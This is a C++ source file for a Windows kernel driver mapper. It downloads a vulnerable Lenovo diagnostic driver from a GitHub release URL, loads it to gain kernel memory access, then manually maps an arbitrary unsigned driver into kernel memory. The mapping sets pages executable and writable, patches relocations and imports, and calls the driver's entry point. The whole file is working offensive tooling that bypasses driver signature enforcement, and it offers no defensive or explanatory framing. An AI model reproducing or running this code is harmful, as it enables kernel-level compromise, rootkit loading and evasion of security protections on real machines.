#include "DriverMapper.hpp"
#include "loadup.hpp"
#include "ldiagd.hpp"
#include <iostream>
#include <fstream>
#include <vector>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

BOOL DriverMapper::DownloadFile(const std::string& url, const std::string& outputPath) {
    std::cout << "[*] Downloading vulnerable driver from: " << url << "\n";

    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), outputPath.c_str(), 0, NULL);

    if (SUCCEEDED(hr)) {
        std::cout << "[+] Download complete: " << outputPath << "\n";
        return TRUE;
    }

    std::cout << "[-] Download failed. Error: 0x" << std::hex << hr << "\n";
    return FALSE;
}

std::vector<uint8_t> DriverMapper::DownloadVulnerableDriver() {
    const std::string driverUrl = "https://github.com/ledgerbtc/ashy1337-drivermapper/releases/download/driver/lenovodiag.sys";

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFile = std::string(tempPath) + "lenovodiag.sys";

    // Try to download
    if (!DownloadFile(driverUrl, tempFile)) {
        // Fallback: try local file
        std::cout << "[*] Trying local file...\n";
        auto local = ReadAllBytes("lenovodiag.sys");
        if (!local.empty()) return local;

        return {};
    }

    // Read downloaded file
    auto data = ReadAllBytes(tempFile.c_str());

    // Cleanup temp file
    DeleteFileA(tempFile.c_str());

    return data;
}

BOOL DriverMapper::Init() {
    std::vector<uint8_t> vulnDriver = DownloadVulnerableDriver();

    if (vulnDriver.empty()) {
        std::cout << "[-] Failed to download or load vulnerable driver.\n";
        return FALSE;
    }

    std::cout << "[*] Loaded driver (" << vulnDriver.size() << " bytes)\n";

    auto result = driver::load(vulnDriver);
    NTSTATUS status = result.first;
    service_name = result.second;

    if (!NT_SUCCESS(status)) {
        std::cout << "[-] Failed to load vulnerable driver: 0x" << std::hex << status << "\n";
        return FALSE;
    }

    std::cout << "[+] Vulnerable driver loaded: " << service_name << "\n";
    Sleep(100);

    return TRUE;
}

BOOL DriverMapper::Shutdown() {
    if (!service_name.empty()) {
        NTSTATUS status = driver::unload(service_name);
        if (!NT_SUCCESS(status)) {
            std::cout << "[!] Warning: Driver unload returned: 0x" << std::hex << status << "\n";
        }
    }
    return TRUE;
}

std::vector<uint8_t> DriverMapper::ReadAllBytes(const char* filename) {
    std::ifstream ifs(filename, std::ios::binary | std::ios::ate);
    if (!ifs.is_open()) return {};

    auto pos = ifs.tellg();
    std::vector<uint8_t> result(static_cast<size_t>(pos));

    ifs.seekg(0, std::ios::beg);
    ifs.read(reinterpret_cast<char*>(result.data()), pos);
    ifs.close();

    return result;
}

NTSTATUS DriverMapper::MapDriver(const std::string& driver_path) {
    auto image_vec = ReadAllBytes(driver_path.c_str());
    if (image_vec.empty()) {
        std::cout << "[-] Failed to read target driver\n";
        return STATUS_UNSUCCESSFUL;
    }

    ldiagd::MemoryManager mem;
    if (!mem.Initialize()) {
        std::cout << "[-] Failed to initialize memory manager\n";
        return STATUS_UNSUCCESSFUL;
    }

    std::cout << "[+] Kernel access established\n";
    std::cout << "[*] ntoskrnl.exe: 0x" << std::hex << mem.NtosBase << "\n";

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(image_vec.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "[-] Invalid DOS signature\n";
        return STATUS_UNSUCCESSFUL;
    }

    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(image_vec.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        std::cout << "[-] Invalid PE or not x64\n";
        return STATUS_UNSUCCESSFUL;
    }

    auto* opt = &nt->OptionalHeader;
    size_t imageSize = (opt->SizeOfImage + 0xFFF) & ~0xFFF;

    UINT64 allocPages = mem.GetKernelExport("MmAllocateIndependentPages");
    UINT64 setProt = mem.GetKernelExport("MmSetPageProtection");
    UINT64 rtlCopy = mem.GetKernelExport("RtlCopyMemory");

    if (!allocPages || !setProt || !rtlCopy) {
        std::cout << "[-] Failed to resolve kernel functions\n";
        return STATUS_UNSUCCESSFUL;
    }

    std::cout << "[*] Allocating 0x" << std::hex << imageSize << " bytes in kernel...\n";

    UINT64 base = mem.CallKernelFunction(allocPages, imageSize, 0, 0, 0);
    if (!base) {
        std::cout << "[-] Failed to allocate kernel memory\n";
        return STATUS_UNSUCCESSFUL;
    }

    mem.CallKernelFunction(setProt, base, imageSize, PAGE_EXECUTE_READWRITE, 0);
    std::cout << "[+] Allocated at: 0x" << std::hex << base << "\n";

    auto* localBuffer = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!localBuffer) {
        std::cout << "[-] Failed to allocate local buffer\n";
        return STATUS_UNSUCCESSFUL;
    }

    memcpy(localBuffer, image_vec.data(), opt->SizeOfHeaders);

    auto* section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        if (section->SizeOfRawData) {
            memcpy(static_cast<uint8_t*>(localBuffer) + section->VirtualAddress,
                image_vec.data() + section->PointerToRawData,
                section->SizeOfRawData);
        }
    }

    INT64 delta = base - opt->ImageBase;
    if (delta != 0 && opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto* reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            static_cast<uint8_t*>(localBuffer) + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        while (reloc->VirtualAddress) {
            int count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            auto* addr = reinterpret_cast<uint16_t*>(reloc + 1);

            for (int i = 0; i < count; i++) {
                if ((addr[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    auto* patch = reinterpret_cast<UINT64*>(
                        static_cast<uint8_t*>(localBuffer) + reloc->VirtualAddress + (addr[i] & 0xFFF));
                    *patch += delta;
                }
            }
            reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
        }
    }

    if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        auto* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            static_cast<uint8_t*>(localBuffer) + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        while (importDesc->Name) {
            auto* thunk = reinterpret_cast<UINT64*>(
                static_cast<uint8_t*>(localBuffer) +
                (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
            auto* func = reinterpret_cast<UINT64*>(static_cast<uint8_t*>(localBuffer) + importDesc->FirstThunk);

            for (int i = 0; thunk[i]; i++) {
                UINT64 importAddr = 0;

                if (IMAGE_SNAP_BY_ORDINAL(thunk[i])) {
                    std::cout << "[!] Warning: Import by ordinal not supported\n";
                    VirtualFree(localBuffer, 0, MEM_RELEASE);
                    return STATUS_UNSUCCESSFUL;
                }
                else {
                    auto* byName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        static_cast<uint8_t*>(localBuffer) + thunk[i]);
                    importAddr = mem.GetKernelExport(byName->Name);
                }

                if (!importAddr) {
                    std::cout << "[-] Failed to resolve import\n";
                    VirtualFree(localBuffer, 0, MEM_RELEASE);
                    return STATUS_UNSUCCESSFUL;
                }
                func[i] = importAddr;
            }
            importDesc++;
        }
    }

    std::cout << "[*] Writing to kernel memory...\n";

    const size_t chunkSize = 0x1000;
    for (size_t offset = 0; offset < imageSize; offset += chunkSize) {
        size_t writeSize = (offset + chunkSize > imageSize) ? (imageSize - offset) : chunkSize;
        mem.CallKernelFunction(rtlCopy, base + offset,
            reinterpret_cast<UINT64>(static_cast<uint8_t*>(localBuffer) + offset),
            writeSize, 0);
    }

    VirtualFree(localBuffer, 0, MEM_RELEASE);

    UINT64 entry = base + opt->AddressOfEntryPoint;
    std::cout << "[*] Calling DriverEntry at 0x" << std::hex << entry << "\n";

    NTSTATUS status = static_cast<NTSTATUS>(mem.CallKernelFunction(entry, base, 0x1337, 0, 0));

    mem.Shutdown();
    return status;
}